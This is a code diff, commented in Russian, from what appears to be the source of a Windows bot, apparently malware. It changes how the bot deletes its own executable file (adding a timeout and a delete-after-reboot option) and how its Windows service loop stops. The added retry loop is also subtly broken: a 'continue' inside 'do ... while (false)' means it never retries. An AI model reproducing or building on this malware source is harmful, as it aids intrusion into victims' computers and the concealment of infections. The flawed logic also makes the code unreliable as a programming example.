@@ -429,12 +429,27 @@ namespace BOT
     }
 
 	//удаляет тело (файл) бота
-	void DeleteBotFile( const char* FileName )
+	void DeleteBotFile( const char* FileName, DWORD TimeOut, bool DeleteAfterReboot )
 	{
 		// Удаляем файл
 		pSetFileAttributesA(FileName, FILE_ATTRIBUTE_NORMAL );
-		BOOL Deleted = (BOOL)pDeleteFileA(FileName);
-		if (!Deleted)
+		DWORD Start = (DWORD)pGetTickCount();
+		BOOL Deleted;
+		do
+		{
+			Deleted = (BOOL)pDeleteFileA(FileName);
+			if ((TimeOut && (DWORD)pGetTickCount() - Start <= TimeOut))
+			{
+				// В случае если указан таймаут то приостанавливаем выполнение
+				// и пытаемся ещё раз удалить
+				pSleep(250);
+				continue;
+			}
+		}
+		while (false);
+
+
+		if (!Deleted && DeleteAfterReboot)
 		{
 			// Не удалось на прямую удалить файл.
 			// Удаляем файл после перезагрузки
@@ -535,8 +550,12 @@ namespace BOT
 		// Запускаем бесконечный цикл ожидания прерывания работы сервиса
 		while (BotData->ServiceStatus.dwCurrentState == SERVICE_RUNNING)
 		{
-			pSleep(1000);
+			pSleep(500);
 		}
+
+		BotData->ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+		pSetServiceStatus (BotData->ServiceStatusHandle, &BotData->ServiceStatus);
+
 	}
 	//----------------------------------------------------------------------
 
@@ -847,7 +866,7 @@ bool BOT::UninstallService()
 		// Удалем файл
 		string ExeName = GetServiceFullExeName();
 		COREDBG("BotCore", "Сервис деинсталирован. Удаляем ехе %s", ExeName.t_str());
-		DeleteBotFile(ExeName.t_str());
+		DeleteBotFile(ExeName.t_str(), 30000, false);
 	}
 	else
     	COREDBG("BotCore", "Ошибка деинсталяции сервиса. Ошибка %d", pGetLastError());
